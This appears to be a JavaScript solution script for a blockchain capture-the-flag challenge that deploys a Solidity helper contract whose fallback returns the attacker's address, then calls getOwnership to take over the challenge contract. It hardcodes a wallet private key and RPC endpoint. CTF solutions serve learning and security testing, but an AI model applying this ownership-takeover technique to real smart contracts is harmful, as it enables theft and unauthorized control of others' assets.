const { ethers, JsonRpcProvider } = require("ethers");
const solc = require("solc");

const SETUP_ADDRESS = "0xBaD1Bf25A3EB1786a0105F429fA63014eA092ea0";
const CHALLENGE_ADDRESS = "0xCf28A080bc6EcAf35764B1e39a8577082B56707b";
const ADDRESS = "0x49F9cdFb00EfA58962Fe062D91B8cCeccEFE5D25";
const PRIVATE_KEY = "0xf17789631ebf2eb733017fa1b6df40ace37ec1e0c8e4742996917b3f37aef572";
const RPC_URL = "https://otter.bordel.wtf/erigon";

const setupABI = ["function isSolved() external view returns (bool)"];
const challengeABI = [
    "function transferOwnership(address newOwner) external",
    "function getOwnership(address account) external",
    "function owner() external view returns (address)",
];

async function compileHelper() {
    const helperSource = `pragma solidity ^0.8.0;
contract Helper {
    // 'target' is stored in slot 0.
    address public target;
    constructor(address _target) {
        target = _target;
    }
    // Fallback returns 32 bytes containing 'target'
    fallback() external {
        assembly {
            let t := sload(0)
            mstore(0, t)
            return(0, 32)
        }
    }
}`;

    const input = {
        language: 'Solidity',
        sources: {
            'Helper.sol': {
                content: helperSource
            }
        },
        settings: {
            outputSelection: {
                '*': {
                    '*': ['*']
                }
            }
        }
    };

    const output = JSON.parse(solc.compile(JSON.stringify(input)));
    const compiledHelper = output.contracts["Helper.sol"]["Helper"];
    const helperAbi = compiledHelper.abi;
    const helperBytecode = compiledHelper.evm.bytecode.object;
    return [helperAbi, helperBytecode];
}

async function exploit() {
    const provider = new JsonRpcProvider(RPC_URL);
    const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
    console.log("Connected as:", wallet.address);

    const setup = new ethers.Contract(SETUP_ADDRESS, setupABI, wallet);
    const challenge = new ethers.Contract(CHALLENGE_ADDRESS, challengeABI, wallet);

    console.log("Owner before exploit:", await challenge.owner());
    console.log("Is solved:", await setup.isSolved());

    const [helperAbi, helperBytecode] = await compileHelper();

    console.log("Deploying Helper contract...");
    const helperFactory = new ethers.ContractFactory(helperAbi, helperBytecode, wallet);
    const helper = await helperFactory.deploy(wallet.address);
    const helperAddress = await helper.getAddress();
    await helper.waitForDeployment();
    console.log("Helper deployed at:", helperAddress);

    console.log("Calling getOwnership with helper address...");
    const tx = await challenge.getOwnership(helperAddress);
    await tx.wait();
    console.log("Transaction confirmed");

    /* console.log("Transferring ownership to wallet...");
    const tx2 = await challenge.transferOwnership(wallet.address);
    await tx2.wait();
    console.log("Ownership transferred to wallet"); */

    console.log("Owner after exploit:", await challenge.owner());
    console.log("Is solved:", await setup.isSolved());
}

exploit();
